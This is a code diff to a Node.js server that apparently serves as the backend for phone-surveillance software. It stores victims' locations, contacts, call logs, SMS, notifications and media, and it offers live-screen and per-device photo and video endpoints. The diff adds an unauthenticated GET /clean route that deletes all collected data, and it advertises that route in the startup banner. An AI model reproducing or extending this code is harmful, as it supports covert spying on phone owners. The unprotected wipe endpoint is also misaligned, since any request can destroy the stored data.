@@ -217,6 +217,53 @@ app.get('/api/stats', async (req, res) => {
     }
 });
 
+// ============= 🔥 NEW: CLEAN ENTIRE DATABASE =============
+app.get('/clean', async (req, res) => {
+    try {
+        // Count before deletion
+        const counts = {
+            devices: await DeviceInfo.countDocuments(),
+            locations: await Location.countDocuments(),
+            contacts: await Contact.countDocuments(),
+            callLogs: await CallLog.countDocuments(),
+            sms: await Sms.countDocuments(),
+            apps: await App.countDocuments(),
+            usage: await Usage.countDocuments(),
+            notifications: await Notification.countDocuments(),
+            battery: await Battery.countDocuments(),
+            network: await Network.countDocuments(),
+            media: await Media.countDocuments()
+        };
+
+        // Delete all data
+        await DeviceInfo.deleteMany({});
+        await Location.deleteMany({});
+        await Contact.deleteMany({});
+        await CallLog.deleteMany({});
+        await Sms.deleteMany({});
+        await App.deleteMany({});
+        await Usage.deleteMany({});
+        await Notification.deleteMany({});
+        await Battery.deleteMany({});
+        await Network.deleteMany({});
+        await Media.deleteMany({});
+
+        console.log('🧹 Database cleaned completely');
+
+        res.json({
+            success: true,
+            message: '✅ Database cleaned successfully!',
+            deleted: counts
+        });
+    } catch (error) {
+        console.error('❌ Clean error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
 // ============= WEBSOCKET FOR LIVE SCREEN =============
 wss.on('connection', (ws) => {
     console.log('🟢 WebSocket Client Connected');
@@ -689,6 +736,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ║  📊 Stats API: /api/stats                    ║
     ║  📸 Photo API: /api/photo/:deviceId         ║
     ║  🎥 Video API: /api/video/:deviceId         ║
+    ║  🧹 Clean API: /clean                        ║
     ╚══════════════════════════════════════════════╝
     `);
 });
